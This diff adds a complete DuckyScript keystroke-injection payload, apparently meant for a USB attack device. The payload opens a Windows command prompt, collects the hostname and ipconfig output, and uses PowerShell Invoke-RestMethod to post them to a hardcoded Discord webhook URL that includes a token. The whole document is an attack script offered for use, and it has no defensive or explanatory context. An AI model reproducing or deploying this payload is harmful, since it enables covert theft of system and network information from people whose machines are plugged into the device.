@@ -1,0 +1,20 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING hostname
+ENTER
+DELAY 500
+STRING ipconfig
+ENTER
+DELAY 1000
+STRING powershell -command "$body = @{content = "Hostname: $($env:COMPUTERNAME)`n$(ipconfig | Out-String)"}"
+ENTER
+DELAY 800
+STRING powershell -command "$jsonBody = $body | ConvertTo-Json -Compress"
+ENTER
+DELAY 800
+STRING powershell -command "Invoke-RestMethod -Method Post -Uri "https://discord.com/api/webhooks/1338311634757746750/Qi7ydqNIEvqJ_Zbbrv-N4Ekj7HGo7vRfUm7Q14Buccb0G5Bf4TbUwShrylHZHCZ3lVL-" -Body $jsonBody -ContentType "application/json""
+ENTER
